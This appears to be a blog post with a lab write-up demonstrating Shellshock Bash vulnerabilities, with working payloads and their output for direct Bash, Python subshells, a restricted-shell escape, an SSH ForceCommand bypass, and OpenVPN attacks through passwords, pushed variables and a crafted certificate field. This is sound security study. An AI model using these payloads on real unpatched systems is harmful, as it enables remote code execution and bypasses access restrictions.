---
layout: post
title: "() { Magic Bash Runes"
tags: [bash, shellshock, hacking]
---

Despite of been 4 years old, ``Shellshock`` is still a very interesting
topic to me not for the vulnerability itself but for the large
ways to trigger it even in the most unexpected places.

Take the 4 characters ``() {`` and open the world.

{% call marginfig('runes.png') %}
Fragments found in the field.
{% endcall %}

Creativity and few hours reading man pages are all what you need.<!--more-->


### Lab

For the following examples I created a docker image that compiles
a vulnerable Bash version.

{% call marginnotes() %}
Based on this [Dockerfile](https://github.com/tianon/docker-bash/tree/master/4.1)
{% endcall %}

From [here]({{ asset('') }}) you can download
the Dockerfile and the rest of the files and
build the image yourself:

```shell
$ docker build -t shellshock .      # byexample: +skip
<...>
Successfully tagged shellshock:latest
```

From there, run the following to get a temporal shell:

```shell
$ docker run -it --rm  --cap-add=NET_ADMIN shellshock       # byexample: +skip
```

> If the ``--cap-add=NET_ADMIN`` looks to you a little suspicious, I don't
> blame you. The flag is needed to run the OpenVPN examples.

Then, to run the SSH examples you need to run the SSH server:

```shell
$ /usr/sbin/sshd                    # byexample: +fail-fast
```

And for the OpenVPN examples, you need to create a TUN device:

```shell
$ mkdir -p /dev/net
$ [ -e /dev/net/tun ] || mknod /dev/net/tun c 10 200;      # byexample: +fail-fast
```

<!--
$ ssh -p 2201 127.0.0.1 'ls'        # byexample: +pass
$ ssh -p 2202 127.0.0.1 'ls'        # byexample: +pass
-->

## Magic Bash runes

Bash allows to write a function definition inside of an environment variable
and pass it to a subshell.

The only requirement is that the definition must begin with the magic ``() {``
four bytes.

## CVE-2014-6271: ``() { :;}; CMD``

When Bash passes that env var, it will detect the ``() {`` prefix and
it will parse *and* execute the remaining function definition.

The bug happen because Bash will not stop after the function's end
but it will continue parsing and executing the rest ``CMD``.

Try this in the lab:

```shell
$ X='() { :; }; /bin/echo vuln'
$ export X
$ bash -c 'echo "foo"'
vuln
<...>
```

<!--
$ unset X   # byexample: +pass
-->

Or, in one line:

```shell
$ X='() { :; }; /bin/echo vuln' bash -c 'echo "foo"'
vuln
<...>
```

If you are vulnerable, that command should print ``vuln``
(and probably it will crash too).

Because the bug happens in a very early phase, ``CMD`` must be
with the full path (``PATH`` may not exist)


### CVE-2014-7169: ``() { function a a>\`` & ``bash -c "FILE CMD"``

The incantation of these runes has two parts.

Imagine the following command that prints two words:

<!-- no colors for this -->
```
$ echo echo vuln
echo vuln
```

The first ``echo`` is the command and the rest its arguments: it
has nothing weird on its own.

The ``() { function a a>\`` part makes a *incomplete* function
definition, in particular
the fragment ``a>\`` will redirect to a unspecified file the output
and Bash will complete the definition with the *next input*.

And here is where the magic happens.

The first ``echo`` will *not* be the command but the name of the file
to redirect the output.

The rest of the input ``echo vuln`` will be interpreted as a full
command: that means that the first argument is converted to
the name of a command.

```shell
$ X='() { function a a>\' bash -c "echo echo vuln"
<...>

$ cat echo
vuln
```

<!--
$ rm -f echo    # clean up
-->

Instead of printing the literal ``"echo vuln"`` string and cat-ing
an inexistent file ``"echo"``,
a vulnerable Bash will execute the first argument and it will redirect
its output to a file named ``"echo"``.

Here is another example.

```shell
$ bash -c 'echo $0 $1 | hd' A B
00000000  41 20 42 0a                                       |A B.|
00000004
```

If the attacker controls ``$0`` and ``$1``, he can trigger the vuln
setting ``$0`` to the command of his desire and ``$1`` to ``#`` to comment out
the pipe (the arguments must be without quotes, ``"$1"`` will not work).

```shell
$ X='() { function a a>\' bash -c "echo id # | hd"; cat echo
<...>
uid=0(root)<...>
```
<!--
$ rm -f echo    # clean up
-->

Another example, a shorter variant with less runes needed:

```shell
$ X='() { (a)=>\' bash -c "echo id"; cat echo
<...>
uid=0(root)<...>
```

<!--
$ rm -f echo    # clean up
-->

### CVE-2014-6278: ``() { _; } >_[$($())] { CMD }``

The interesting thing is that
this doesn't look like a parsing bug but a feature.

I was succeeded to trigger this one in a vulnerable VM from
[PentesterLab](https://pentesterlab.com/exercises/cve-2014-6271)
but I couldn't trigger it in my own lab.

Here is how it should be invoked:

```shell
$ X='() { _; } >_[$($())] { /bin/sleep 5 }' bash -c 'date'      # byexample: +skip
```

## Subshells from Python, Ruby

It is not necessary to run Bash directly to trigger the vuln.

Any process that pass the env variables to a vulnerable Bash is enough:

```shell
$ X='() { :; }; echo "vuln"' python -c 'import os; os.system("ls")'
vuln
<...>
```

Python's ``os.system`` spawns a shell, typically ``/bin/sh`` and runs
inside it the given command.

The trick is that ``/bin/sh`` in some mainstream systems is a link
to ``/bin/bash``, enabling the bug to other interpreters.

Python, Ruby, virtually any software the spawn a subshell is affected.


## Restricted Bash bypass

We cannot trigger the vuln if the shell spawned is in restricted mode

```shell
$ X='() { :;}; /bin/echo vuln' bash -r -c 'echo baz'
baz
```

This is because:

> "A restricted shell [...] (does not allow) importing function definitions
> from the shell environment at startup"
>
> <footer><a href="https://linux.die.net/man/1/bash">bash(1)</a>, <em>Restricted shell</em></footer>

But the same man page gives us a way to escape: nothing prevent us to
trigger the vuln *within* the restricted shell:

> "When a command that is found to be a shell script is executed [...],
> rbash  turns  off  any restrictions in the shell spawned to execute
> the script."
>
> <footer><a href="https://linux.die.net/man/1/bash">bash(1)</a>, <em>Restricted shell</em></footer>

The only thing that we need is just an executable shell script in the ``PATH``
to target it:

```shell
$ cat /bin/egrep
#!/bin/sh
exec grep -E "$@"

$ X='() { :;}; /bin/echo vuln' bash -r -c 'egrep'
vuln
<...>
```

This may allow you to escape from the restricted shell or at least it will
allow you to perform some prohibited actions like ``cd`` or redirections:

```shell
$ X='() { :;}; cd /home ; echo "foo" > bar ' bash -r -c 'egrep'
<...>

$ cat /home/bar
foo
```

<!--
$ rm -f /home/bar # clean up
-->

{% call marginnotes() %}
I am sure that there are other clever
and creative ways to *priv esc* using shellshock besides using a
``setuid`` program.
{% endcall %}

If you think, this can be used for a privilege escalation:
running as a
normal user, if a ``setuid`` program spawn a shell you will get a path to root
pretty straightforward.

## SSH

SSH will send some environment variables by default, like ``TERM``
regardless of the configuration of the server or client as long as
we allocate a remote pseudo-terminal (``-t``)

    " [...] the TERM environment variable is always sent whenever
    a pseudo-terminal is requested as it is required by the protocol."

```shell
$ TERM='() { :;}; /bin/echo vuln' ssh -t -p 2201 127.0.0.1 exit
vuln<...>
```

This may seems pointless because we have a remote shell anyways.

But SSH has a ``ForceCommand`` option that set a command to be executed
when the user logs in, ignoring any command supplied by him.

This is used by some folks to restrict the access to the system, typically
setting this to ``/bin/false`` or something like that:

```shell
$ ssh -p 2202 127.0.0.1 'ls'
No shell for you. Sorry.
```

But the forced command is executed by the user's shell configured in the
server. If this one is Bash, we can bypass the restriction.

This option opens another crack as it sets the ``SSH_ORIGINAL_COMMAND``
environment variable with the value of the intended and ignored command.

So, if instead ``ls`` we set our magic runes we will get remote execution:

```shell
$ ssh -p 2202 127.0.0.1 '() { :;}; /bin/echo vuln'
vuln
<...>
```

## OpenVPN

{% call marginnotes() %}
By the way, the [OpenVPN](https://github.com/OpenVPN/openvpn/tree/master/sample)
repository has a very complete script that
shows you how to create CA, Certs and other stuff. Nice!
{% endcall %}

In the following examples the
[configuration files]({{ asset('files') }})
``vpn-srv.conf`` and
``vpn-cli.conf`` sets the IP addresses, ports and certificates:
standard stuff.

In each example I am passing the extra
parameters that enable the attack
explicitly via command line.

### User and Pass

In this first scenario the server uses a Bash script to verify the
user's name and password.

To open the door to the vulnerability, the server must pass
the credentials using environment variables.

OpenVPN will reject this by default so we need to set
the highest security level with ``--script-security 3`` to allow this.

```shell
$ openvpn --config vpn-srv.conf --auth-user-pass-verify login.sh via-env --mode server --script-security 3 >/dev/null &
<...>
```

From the client side, the magic runes need to be in the credential file,
in the place of the password:

```shell
$ openvpn --config vpn-cli.conf --auth-user-pass evil-cred --pull >/dev/null   # byexample: +stop-on-silence +timeout=5
<...>

$ cat evil-cred
foo
() { :;}; /bin/touch pwned
```

<!--
$ rm -f pwned # clean up
$ killall openvpn ; wait  # byexample: +pass
-->

And *presto*, the client has remote execution in the server.

But, only in the password.... Why?

The runes need to be in the password, because it is not *remapped*.

OpenVPN remaps the values of the env variables allowing a very reduced
set of symbols; the password is not affected, thanks God!

It could be in the username too as starting OpenVPN 2.0.1 it is not
remapped any more when it is passed to
``OPENVPN_PLUGIN_AUTH_USER_PASS_VERIFY`` plugin.

If this is vulnerable or not is another story.

### Push and Pull

Now the roles are inverted here.

In this case the server will set up a trap to get remote execution
on the client side.

For this, it pushes a environment variable to the client with the
magic runes:

```shell
$ openvpn --config vpn-srv.conf --push 'setenv-safe Z "() { :;}; /bin/touch pwned"' &
<...>
```

The client needs to *pull* the variables and execute some external script.

I chose ``--up`` but other should work

```shell
$ openvpn --config vpn-cli.conf --up env.sh --script-security 2 --pull   # byexample: +stop-on-silence +timeout=5
<...>

$ [ -e pwned ] && echo "you've been pwned"
you've been pwned
```

<!--
$ rm -f pwned # clean up
$ killall openvpn ; wait  # byexample: +pass
-->

The ``setenv-safe`` sets an environment variable with a safe name (prefixed
with ``OPENVPN``) but the trick is not in the name but in its content.

The client will execute a shell script (needs at least ``--script-security 2``)
and the malicious env var will be pushed to the client, executed and exploited.


### X509 param

This one is tricky.

All the scripts that OpenVPN can execute receive a *remapped* version of the
environment variables.

Depending of the variable the remap allows more or less character but
in any case the remap process destroys the magic runes.

But the are exceptions: ``password`` as it was mentioned before
and ``X509_{n}_{m}``.

When a endpoint uses an external script to validate the TLS identity
through ``--tls-verify``, it receives an environment variable for each
part of the ``Subject`` of the both certificates: the client's and
the server's.

Here the server sets up an evil certificate:

```shell
$ openvpn --config vpn-srv.conf --cert evil.crt --key evil.key  >/dev/null &
<...>
```

The malicious certificate has a crafted ``emailAddress`` inside
of the ``Subject`` that has the incantation.

```shell
$ openssl x509 -in evil.crt -text
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 2 (0x2)
    Signature Algorithm: sha256WithRSAEncryption
        <...>
        Subject: C=KG, ST=NA, <...>emailAddress=() { :;}; /bin/cp /bin/cp /
<...>
```

On the client side, we just have to verify TLS with a script and allow it
to run with ``--script-security 2``:

```shell
$ openvpn --config vpn-cli.conf --tls-verify env.sh --script-security 2   # byexample: +stop-on-silence +timeout=5
<...>

$ [ -e /cp ] && echo "you've been pwned"
you've been pwned
```

The variables ``X509_{n}_{m}`` will contain the *raw* pieces of ``Subject``
of the client's certificate (``{n} = 1``) and the server's certificate
(``{n} = 0``) where ``{m}`` will have the ``Subject``'s field name, like
``emailAddress``.

Does it mean that we can reverse the roles and exploit the server? Who knows.

In my container lab I couldn't trigger the bug: it seems that the server
verification fails but it doesn't execute the payload.

So in theory yes, but I don't have evidence.

<!--
$ rm -f cp  # clean up
$ killall openvpn ; wait  # byexample: +pass
-->

## Final thoughts

What I can say? Having a remote execution crafting a X509 attribute
writing just ``() {`` makes me think about the complexity of
the software with a smile in my face.

{% call marginnotes() %}
See these in [lcamtuf's post](https://lcamtuf.blogspot.com/2014/10/bash-bug-how-we-finally-cracked.html)
{% endcall %}

There are more vulnerabilities
and [vectors](https://github.com/mubix/shellshocker-pocs)
out there than the shown here: Web Servers, CUPS, DHCP.

``Shellshock`` came up 4 years ago and it is still surprising me.

